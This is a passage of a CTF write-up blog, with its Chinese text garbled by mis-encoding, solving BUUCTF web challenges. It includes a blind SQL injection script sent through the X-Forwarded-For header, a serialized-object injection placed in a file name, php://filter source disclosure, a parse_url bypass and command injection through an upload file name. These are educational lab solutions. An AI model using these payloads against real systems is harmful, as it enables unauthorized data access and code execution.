class="language-none">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d)#.png</code></pre><p>è§£é‡Šï¼šçœ‹showé‡Œååºåˆ—åŒ–çš„éƒ¨åˆ†ï¼Œæ˜¯åªå¯¹attréƒ¨åˆ†è¿›è¡Œäº†ååºåˆ—åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ„é€ çš„æ—¶å€™ï¼Œå°±è¦æŠŠæˆ‘ä»¬çš„åºåˆ—åŒ–è¯­å¥æ”¾åœ¨attrçš„ä½ç½®ä¸Šï¼Œå‰è¾¹å››ä¸ªæ”¾1ï¼Œå¹¶ä¸”ç”¨å•å¼•å·æ¥é—­åˆå‰é¢çš„ç¬¬ä¸€ä¸ªå•å¼•å·ï¼Œ#æ˜¯ä¸ºäº†æ³¨é‡Šåé¢çš„sqlè¯­å¥ï¼Œä¿è¯é¡ºåˆ©æ‰§è¡Œï¼Œ.pngæ˜¯ä¿è¯æ˜¯ä¸ªå›¾ç‰‡çš„åç¼€ï¼Œè®©æ–‡ä»¶èƒ½ä¼ ä¸Šå»</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419184421898.png"></p><p>è€Œ</p><pre class="language-txt" data-language="txt"><code class="language-txt">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</code></pre><p>æ˜¯<code>O:6:&quot;helper&quot;:2:&#123;s:9:&quot;\0\0\0ifview&quot;;b:1;s:9:&quot;\0\0\0config&quot;;s:5:&quot;/flag&quot;;&#125;</code>çš„åå…­è¿›åˆ¶å½¢å¼ï¼Œå› ä¸ºæ–‡ä»¶åä¸å…è®¸å­˜åœ¨åŒå¼•å·ï¼Œ\0æ˜¯å› ä¸ºæˆ‘ä»¬çš„åºåˆ—åŒ–çš„ä¸¤ä¸ªå±æ€§éƒ½æ˜¯protectedç±»å‹çš„ï¼Œè€Œåœ¨å‚¨å­˜æ—¶å¯¹protectedåºåˆ—åŒ–åå‡ºç°çš„ä¸å¯è§å­—ç¬¦ä¸*çš„ç»„åˆè¿›è¡Œäº†æ›¿æ¢ï¼Œå°†chr(0)*chr(0)æ›¿æ¢ä¸ºäº†\0\0\0ï¼Œåœ¨ååºåˆ—åŒ–æ—¶åˆæ¢äº†å›å»ï¼Œä¸ºäº†ç¨‹åºçš„æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å°†å…¶æ›¿æ¢</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419184018967.png" alt="image-20220419184018967"></p><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>ä¸€é“åƒssrfçš„é¡µé¢ï¼Œä½†å®é™…ä¸Šæ˜¯xffå¤´çš„äºŒæ¬¡æ³¨å…¥</p><pre class="language-none"><code class="language-none">æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ï¼Œå…ˆè¾“å…¥ 1â€™ or â€˜1 æ­¤æ—¶æˆ‘ä»¬çš„current IPå°±ç­‰äºå®ƒï¼Œç„¶åæˆ‘ä»¬å†éšä¾¿æ¢ä¸€ä¸ªå…¶ä»–çš„ä¸œè¥¿ï¼Œåªè¦å’Œåˆšæ‰é‚£ä¸ªä¸ä¸€æ ·å°±å¯ä»¥ï¼Œæ¯”å¦‚111ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„current IPå°±æˆäº†ï¼š111ï¼Œè€Œlast IPå°±æ˜¯1â€™ or â€˜1ï¼Œæ­¤æ—¶1â€™ or &#39;1å·²ç»å†™å…¥äº†æ•°æ®åº“ .å› ä¸ºç¬¬ä¸€æ¬¡å’Œç¬¬äºŒæ¬¡ä¼ è¾“çš„IPä¸ä¸€æ ·ï¼Œæ‰€ä»¥æœåŠ¡å™¨å¹¶ä¸ä¼šä»æ•°æ®åº“æ‰¾last IPï¼Œå®ƒä¼šæŠŠä¸Šæ¬¡çš„IPï¼ˆ1â€™or â€˜1ï¼‰ç›´æ¥æ˜¾ç¤ºä¸ºlast IPï¼Œè®©åå­˜å…¥æ•°æ®åº“ã€‚é‚£ä¹ˆæˆ‘ä»¬å†ä¼ ä¸€æ¬¡111ï¼Œå› ä¸ºå’Œcurrnet IPç›¸åŒï¼Œé‚£ä¹ˆlast IPå°±ä¼šä»æ•°æ®åº“é‡Œå¯»æ‰¾ï¼Œä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œ1â€™orâ€˜1ï¼Œç»“æœä¸ºä¸€ã€‚</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420203914643.png" alt="image-20220420203914643"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420203921117.png" alt="image-20220420203921117"></p><p>æ‰€ä»¥ç›´æ¥è·‘è„šæœ¬å°±è¡Œäº†</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &#39;http:&#x2F;&#x2F;node4.buuoj.cn:28996&#x2F;&#39;flag &#x3D; &#39;&#39;for i in range(1, 100):    length &#x3D; len(flag)    min &#x3D; 32    max &#x3D; 125    while 1:        j &#x3D; min + (max - min) &#x2F;&#x2F; 2        if min &#x3D;&#x3D; j:            flag +&#x3D; chr(j)            print(flag)            break        # çˆ†è¡¨        # payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;F4l9_D4t4B45e&#39;),%d,1))&lt;%d or &#39;0&quot;%(i,j)        # çˆ†åº“        payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))&lt;%d or &#39;0&quot;%(i,j)        # çˆ†åˆ—        # payload1&#x3D;&quot;0&#39; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;F4l9_t4b1e&#39;),%d,1))&lt;%d or &#39;0&quot;%(i,j)        # çˆ†flag        #payload1 &#x3D; &quot;0&#39; or ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),%d,1))&lt;%d or &#39;0&quot; % (i, j)        payload2 &#x3D; &quot;1&quot;        headers &#x3D; &#123;&quot;x-forwarded-for&quot;: payload1,                   &#39;Cookie&#39;: &#39;track_uuid&#x3D;585aabec-e6df-4724-95b8-8c2fa1285f61&#39;&#125;        r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text        # print(r)        headers[&quot;x-forwarded-for&quot;] &#x3D; payload2        r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text        # print(r)        r &#x3D; requests.get(url&#x3D;url, headers&#x3D;headers).text        # print(r)        location &#x3D; r.find(&quot;Last Ip: &quot;)        number &#x3D; r[location + 9:location + 10]        if &#39;1&#39; in number:            max &#x3D; j        else:            min &#x3D; j</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420204220118.png" alt="image-20220420204220118"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420204313445.png" alt="image-20220420204313445"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420204518414.png" alt="image-20220420204518414"></p><p>æœ€åå‡ºflag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220420205247558.png" alt="image-20220420205247558"></p><p>èµµæ€»æ€ä¹ˆè¿˜åœ¨é‡Œè¾¹å¤¹ç§è´§ï¼ˆ</p><h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>æœ‰æ³¨å†Œç•Œé¢register.php</p><p>æ³¨å†Œä¸€ä¸‹ç™»å½•ä¹‹åæ„Ÿè§‰æœ‰ç‚¹åƒä¼ªåè®®</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421201110247.png" alt="image-20220421201110247"></p><p>è¯•ä¸€ä¸‹ï¼ŒæˆåŠŸè¯»åˆ°äº†æºç </p><pre class="language-php" data-language="php"><code class="language-php">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;user</code></pre><p>è§£ç </p><p>user.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phprequire_once(&quot;function.php&quot;);if( !isset( $_SESSION[&#39;user&#39;] ))&#123;    Header(&quot;Location: index.php&quot;);&#125;if($_SESSION[&#39;isadmin&#39;] &#x3D;&#x3D;&#x3D; &#39;1&#39;)&#123;    $oper_you_can_do &#x3D; $OPERATE_admin;&#125;else&#123;    $oper_you_can_do &#x3D; $OPERATE;&#125;&#x2F;&#x2F;die($_SESSION[&#39;isadmin&#39;]);if($_SESSION[&#39;isadmin&#39;] &#x3D;&#x3D;&#x3D; &#39;1&#39;)&#123;    if(!isset($_GET[&#39;page&#39;]) || $_GET[&#39;page&#39;] &#x3D;&#x3D;&#x3D; &#39;&#39;)&#123;        $page &#x3D; &#39;info&#39;;    &#125;else &#123;        $page &#x3D; $_GET[&#39;page&#39;];    &#125;&#125;else&#123;    if(!isset($_GET[&#39;page&#39;])|| $_GET[&#39;page&#39;] &#x3D;&#x3D;&#x3D; &#39;&#39;)&#123;        $page &#x3D; &#39;guest&#39;;    &#125;else &#123;        $page &#x3D; $_GET[&#39;page&#39;];        if($page &#x3D;&#x3D;&#x3D; &#39;info&#39;)        &#123;&#x2F;&#x2F;            echo(&quot;&lt;script&gt;alert(&#39;no premission to visit info, only admin can, you are guest&#39;)&lt;&#x2F;script&gt;&quot;);            Header(&quot;Location: user.php?page&#x3D;guest&quot;);        &#125;    &#125;&#125;filter_directory();&#x2F;&#x2F;if(!in_array($page,$oper_you_can_do))&#123;&#x2F;&#x2F;    $page &#x3D; &#39;info&#39;;&#x2F;&#x2F;&#125;include &quot;$page.php&quot;;?&gt;</code></pre><p>function.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpsession_start();require_once &quot;config.php&quot;;function Hacker()&#123;    Header(&quot;Location: hacker.php&quot;);    die();&#125;function filter_directory()&#123;    $keywords &#x3D; [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];    $uri &#x3D; parse_url($_SERVER[&quot;REQUEST_URI&quot;]);    parse_str($uri[&#39;query&#39;], $query);&#x2F;&#x2F;    var_dump($query);&#x2F;&#x2F;    die();    foreach($keywords as $token)    &#123;        foreach($query as $k &#x3D;&gt; $v)        &#123;            if (stristr($k, $token))                hacker();            if (stristr($v, $token))                hacker();        &#125;    &#125;&#125;function filter_directory_guest()&#123;    $keywords &#x3D; [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;,&quot;info&quot;];    $uri &#x3D; parse_url($_SERVER[&quot;REQUEST_URI&quot;]);    parse_str($uri[&#39;query&#39;], $query);&#x2F;&#x2F;    var_dump($query);&#x2F;&#x2F;    die();    foreach($keywords as $token)    &#123;        foreach($query as $k &#x3D;&gt; $v)        &#123;            if (stristr($k, $token))                hacker();            if (stristr($v, $token))                hacker();        &#125;    &#125;&#125;function Filter($string)&#123;    global $mysqli;    $blacklist &#x3D; &quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;;    $whitelist &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;(),_*&#96;-@&#x3D;+&gt;&lt;&quot;;    for ($i &#x3D; 0; $i &lt; strlen($string); $i++) &#123;        if (strpos(&quot;$whitelist&quot;, $string[$i]) &#x3D;&#x3D;&#x3D; false) &#123;            Hacker();        &#125;    &#125;    if (preg_match(&quot;&#x2F;$blacklist&#x2F;is&quot;, $string)) &#123;        Hacker();    &#125;    if (is_string($string)) &#123;        return $mysqli-&gt;real_escape_string($string);    &#125; else &#123;        return &quot;&quot;;    &#125;&#125;function sql_query($sql_query)&#123;    global $mysqli;    $res &#x3D; $mysqli-&gt;query($sql_query);    return $res;&#125;function login($user, $pass)&#123;    $user &#x3D; Filter($user);    $pass &#x3D; md5($pass);    $sql &#x3D; &quot;select * from &#96;albert_users&#96; where &#96;username_which_you_do_not_know&#96;&#x3D; &#39;$user&#39; and &#96;password_which_you_do_not_know_too&#96; &#x3D; &#39;$pass&#39;&quot;;    echo $sql;    $res &#x3D; sql_query($sql);&#x2F;&#x2F;    var_dump($res);&#x2F;&#x2F;    die();    if ($res-&gt;num_rows) &#123;        $data &#x3D; $res-&gt;fetch_array();        $_SESSION[&#39;user&#39;] &#x3D; $data[username_which_you_do_not_know];        $_SESSION[&#39;login&#39;] &#x3D; 1;        $_SESSION[&#39;isadmin&#39;] &#x3D; $data[isadmin_which_you_do_not_know_too_too];        return true;    &#125; else &#123;        return false;    &#125;    return;&#125;function updateadmin($level,$user)&#123;    $sql &#x3D; &quot;update &#96;albert_users&#96; set &#96;isadmin_which_you_do_not_know_too_too&#96; &#x3D; &#39;$level&#39; where &#96;username_which_you_do_not_know&#96;&#x3D;&#39;$user&#39; &quot;;    echo $sql;    $res &#x3D; sql_query($sql);&#x2F;&#x2F;    var_dump($res);&#x2F;&#x2F;    die();&#x2F;&#x2F;    die($res);    if ($res &#x3D;&#x3D; 1) &#123;        return true;    &#125; else &#123;        return false;    &#125;    return;&#125;function register($user, $pass)&#123;    global $mysqli;    $user &#x3D; Filter($user);    $pass &#x3D; md5($pass);    $sql &#x3D; &quot;insert into &#96;albert_users&#96;(&#96;username_which_you_do_not_know&#96;,&#96;password_which_you_do_not_know_too&#96;,&#96;isadmin_which_you_do_not_know_too_too&#96;) VALUES (&#39;$user&#39;,&#39;$pass&#39;,&#39;0&#39;)&quot;;    $res &#x3D; sql_query($sql);    return $mysqli-&gt;insert_id;&#125;function logout()&#123;    session_destroy();    Header(&quot;Location: index.php&quot;);&#125;?&gt;</code></pre><p>è¿™é‡Œæœ‰ä¸ª<strong>parse_urlçš„è§£ææ¼æ´</strong>ï¼ˆæˆ‘è®°å¾—æˆ‘é‡è§è¿‡ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰å†™åœ¨wpä¸Š</p><pre class="language-php" data-language="php"><code class="language-php">$url0 &#x3D; &quot;&#x2F;baidu.com:80&quot;;&#x2F;&#x2F;å…¨ç‰ˆæœ¬é€šæ€ï¼Œå½“urlæ²¡åè®®æ—¶parse_urlä¼šç›´æ¥æŠ¥é”™$url &#x3D; &quot;httpsadasd:&#x2F;&#x2F;www.baidu.com:80?a&#x3D;123&quot;;$url1 &#x3D; &quot;&#x2F;baidu.com:80a&quot;;&#x2F;&#x2F;ä½†æ˜¯åœ¨ç«¯å£ä¸ŠåŠ ä¸Šå­—æ¯å°±èƒ½æ­£å¸¸è§£æ$url2 &#x3D; &quot;&#x2F;&#x2F;pupiles.com&#x2F;about:1234&quot;;&#x2F;&#x2F;è¿™æ˜¯php5.5ä»¥ä¸Šçš„ä¸€ä¸ªç«¯å£è§£ææ¼æ´ï¼Œè¿™æ ·çš„urlä¼šå°†&#x2F;åçš„å†…å®¹éƒ½pathçœ‹ä½œpath$url3 &#x3D; &quot;&#x2F;&#x2F;baidu.com:80a&quot;;var_dump(parse_url($url0));var_dump(parse_url($url));var_dump(parse_url($url1));var_dump(parse_url($url2));var_dump(parse_url($url3));</code></pre><p>è¿”å›çš„å†…å®¹ä¸º</p><pre class="language-php" data-language="php"><code class="language-php">bool(false)array(4) &#123;  [&quot;scheme&quot;]&#x3D;&gt;  string(10) &quot;httpsadasd&quot;  [&quot;host&quot;]&#x3D;&gt;  string(13) &quot;www.baidu.com&quot;  [&quot;port&quot;]&#x3D;&gt;  int(80)  [&quot;query&quot;]&#x3D;&gt;  string(5) &quot;a&#x3D;123&quot;&#125;array(1) &#123;  [&quot;path&quot;]&#x3D;&gt;  string(14) &quot;&#x2F;baidu.com:80a&quot;&#125;array(3) &#123;  [&quot;host&quot;]&#x3D;&gt;  string(11) &quot;pupiles.com&quot;  [&quot;port&quot;]&#x3D;&gt;  int(1234)  [&quot;path&quot;]&#x3D;&gt;  string(11) &quot;&#x2F;about:1234&quot;&#125;array(2) &#123;  [&quot;host&quot;]&#x3D;&gt;  string(9) &quot;baidu.com&quot;  [&quot;port&quot;]&#x3D;&gt;  int(80)&#125;</code></pre><p>æµ‹è¯•</p><pre class="language-php" data-language="php"><code class="language-php">$url4 &#x3D; &quot;&#x2F;&#x2F;upload?&#x2F;test&#x2F;&quot;;$url5 &#x3D; &quot;&#x2F;upload?&#x2F;1&#x3D;1&amp;id&#x3D;1&quot;;$url6 &#x3D; &quot;&#x2F;&#x2F;&#x2F;upload?id&#x3D;1&quot;;var_dump(parse_url($url4));var_dump(parse_url($url5));var_dump(parse_url($url6));</code></pre><p>è¿”å›çš„å†…å®¹ä¸º</p><pre class="language-php" data-language="php"><code class="language-php">array(2) &#123;  [&quot;host&quot;]&#x3D;&gt;  string(7) &quot;upload?&quot;  [&quot;path&quot;]&#x3D;&gt;  string(6) &quot;&#x2F;test&#x2F;&quot;&#125;array(2) &#123;  [&quot;path&quot;]&#x3D;&gt;  string(7) &quot;&#x2F;upload&quot;  [&quot;query&quot;]&#x3D;&gt;  string(9) &quot;&#x2F;1&#x3D;1&amp;id&#x3D;1&quot;&#125;bool(false)</code></pre><p>è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬éœ€è¦çš„è·¯å¾„è§£ææ¼æ´ï¼Œè¿™ä¸ªåœ¨phpçš„ä¸åŒç‰ˆæœ¬å·®åˆ«è¿˜æ˜¯æŒºå¤§çš„</p><p>5.2åœ¨å‚æ•°å¸¦ä¸ªä¼ªåè®®ç›´æ¥è§£æä¸äº†ã€‚ã€‚ã€‚è€Œä¸”å¥½åƒä¹Ÿæ²¡æœ‰è¿™ä¸ªæ´å’Œ///ç›´æ¥æŠ¥é”™çš„æ´</p><p>5.4ï¼Œ5.5å¯ä»¥ç›´æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ç»•è¿‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421220117699.png" alt="image-20220421220117699"></p><p>ä½†æ˜¯7.0å¼€å§‹å¥½åƒæ˜¯å¯¹å‚æ•°é‡Œçš„ï¼šå’Œ/è¿›è¡Œäº†æ£€æµ‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421220326012.png" alt="image-20220421220326012"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421220436590.png" alt="image-20220421220436590"></p><p>ç„¶åæˆ‘ä»¬å¯ä»¥ç”¨</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;ffffllllaaaagggæˆ–&#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;ffffllllaaaaggg</code></pre><p>è¯»åˆ°ffffllllaaaagggé‡Œçš„å†…å®¹</p><p>è§£ç ä¹‹å</p><pre class="language-none"><code class="language-none">&lt;?phpif (FLAG_SIG !&#x3D; 1)&#123;    die(&quot;you can not visit it directly&quot;);&#125;else &#123;    echo &quot;you can find sth in m4aaannngggeee&quot;;&#125;?&gt;</code></pre><p>é‚£å°±å†çœ‹m4aaannngggeee</p><pre class="language-none"><code class="language-none">&lt;?phpif (FLAG_SIG !&#x3D; 1)&#123;    die(&quot;you can not visit it directly&quot;);&#125;include &quot;templates&#x2F;upload.html&quot;;?&gt;</code></pre><p>è®¿é—®ä¸€ä¸‹åŒ…å«çš„è¿™ä¸ªæ–‡ä»¶</p><p>æ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421221443724.png" alt="image-20220421221443724"></p><p>è™½ç„¶æ²¡æ³•ä¼ ï¼Œä½†æ˜¯è·³è½¬åˆ°äº†ä¸€ä¸ªæ–°çš„é¡µé¢ï¼Œå†ç”¨ä¼ªåè®®è¯»ä¸€ä¸‹</p><p>upllloadddd.php</p><pre class="language-none"><code class="language-none">&lt;?php$allowtype &#x3D; array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);$size &#x3D; 10000000;$path &#x3D; &quot;.&#x2F;upload_b3bb2cfed6371dfeb2db1dbcceb124d3&#x2F;&quot;;$filename &#x3D; $_FILES[&#39;file&#39;][&#39;name&#39;];if(is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]))&#123;    if(!move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$path.$filename))&#123;        die(&quot;error:can not move&quot;);    &#125;&#125;else&#123;    die(&quot;error:not an upload fileï¼&quot;);&#125;$newfile &#x3D; $path.$filename;echo &quot;file upload success&lt;br &#x2F;&gt;&quot;;echo $filename;$picdata &#x3D; system(&quot;cat .&#x2F;upload_b3bb2cfed6371dfeb2db1dbcceb124d3&#x2F;&quot;.$filename.&quot; | base64 -w 0&quot;);echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;png;base64,&quot;.$picdata.&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;if($_FILES[&#39;file&#39;][&#39;error&#39;]&gt;0)&#123;    unlink($newfile);    die(&quot;Upload file error: &quot;);&#125;$ext &#x3D; array_pop(explode(&quot;.&quot;,$_FILES[&#39;file&#39;][&#39;name&#39;]));if(!in_array($ext,$allowtype))&#123;    unlink($newfile);&#125;?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421222040731.png" alt="image-20220421222040731"></p><p>çœ‹è¿™å¥ï¼Œå¦‚æœæˆ‘ä»¬å†filenameå¤„æ’å…¥å‘½ä»¤ï¼Œå°±å¯ä»¥æ‰§è¡Œå®ƒ</p><p>é‚£æˆ‘ä»¬å°±å»æ‰¾çœŸæ­£çš„æ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼Œæƒ³åˆ°ä¹‹å‰çš„m4aaannngggeee</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421225045605.png" alt="image-20220421225045605"></p><p>åˆ©ç”¨åˆ†å·æ‰§è¡Œå¤šä¸ªæ³¨é‡Šï¼Œç„¶ååˆ©ç”¨äº•å·æ³¨é‡Šæ‰åé¢çš„è¯­å¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220421224821554.png" alt="image-20220421224821554"></p><h2 id="ç½‘é¼æ¯-2020-åŠå†³èµ›-AliceWebsite"><a href="#ç½‘é¼æ¯-2020-åŠå†³èµ›-AliceWebsite" class="headerlink" title="[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite"></a>[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite</h2><p>é¢ã€‚ã€‚ã€‚</p><p>çœ‹ä¸‹è½½çš„é™„ä»¶é‡Œçš„index.phpï¼Œæœ‰ä¸€ä¸ªactionå¯ä»¥è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œå®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç„¶åå°±æ˜¯ç›´æ¥çŒœflagæ–‡ä»¶åä¸ºflagï¼Œåœ¨æ ¹ç›®å½•å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711120411219.png" alt="image-20220711120411219"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp1-Welcome"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp1-Welcome" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome</h2><p>æŒºæœ‰æ„æ€çš„ä¸€ä¸ªé¢˜ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆéš¾åº¦</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711121147541.png" alt="image-20220711121147541"></p><p>æ‰“å¼€ç¯å¢ƒçš„æ—¶å€™405è¿˜ä»¥ä¸ºæ˜¯ç¯å¢ƒæœ‰é—®é¢˜ï¼Œä½†æ˜¯è¿™é‡ŒçŠ¶æ€ç æ˜¯405ï¼Œä¹Ÿå°±æ˜¯è¯·æ±‚æ–¹å¼é”™è¯¯ï¼ŒæŠ“åŒ…æ”¹ä¸€ä¸‹è¯·æ±‚æ–¹å¼å°±èƒ½çœ‹è§phpä»£ç äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711121340111.png" alt="image-20220711121340111"></p><p>ç„¶åå°±æ˜¯è€ƒçƒ‚äº†çš„md5çš„ç»•è¿‡ï¼Œåœ¨phpinfoé‡Œæœ‰flag</p><h2 id="HarekazeCTF2019-Avatar-Uploader"><a href="#HarekazeCTF2019-Avatar-Uploader" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader"></a>[HarekazeCTF2019]Avatar Uploader</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711122817759.png" alt="image-20220711122817759"></p><p>æºç é‡Œä¸»è¦çœ‹è¿™ä¸‰ä¸ªåœ°æ–¹ï¼Œå…¶ä»–çš„éƒ½ä¸é‡è¦</p><p>åœ¨æ£€æŸ¥æ–‡ä»¶ç±»å‹æ—¶ï¼Œ<code>finfo_file()</code>å‡½æ•°æ£€æµ‹ä¸Šä¼ å›¾ç‰‡çš„ç±»å‹æ˜¯å¦æ˜¯<code>image/png</code><br>åœ¨æ£€æŸ¥æ–‡ä»¶é•¿å®½æ—¶ï¼Œ<code>getimagesize()</code> å‡½æ•°ç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸå°†è¿”å›ä¸€ä¸ªæ•°ç»„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711122935596.png" alt="image-20220711122935596"></p><p>æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯è®©æœ€åçš„é‚£ä¸ªifæ»¡è¶³</p><p>ä¹Ÿå°±æ˜¯è®©<code>getimagesize()</code> å‡½æ•°è¯†åˆ«ä¸å‡ºä¸Šä¼ çš„ä¸ºpngæ–‡ä»¶</p><p>å› ä¸ºfinfo_file()å¯ä»¥è¯†åˆ«pngå›¾ç‰‡<strong>åå…­è¿›åˆ¶ä¸‹çš„ç¬¬ä¸€è¡Œ</strong>ï¼Œè€Œ getimagesize ä¸å¯ä»¥ã€‚æ‰€ä»¥åªè¦ä¿æŒpngå¤´ç ´åæ‰æ–‡ä»¶é•¿å®½ç­‰å…¶ä½™ä¿¡æ¯å°±èƒ½ç»•è¿‡äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711123221085.png" alt="image-20220711123221085"></p><p>ç„¶åä¸Šä¼ å°±å¯ä»¥äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220711123237676.png" alt="image-20220711123237676"></p><h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 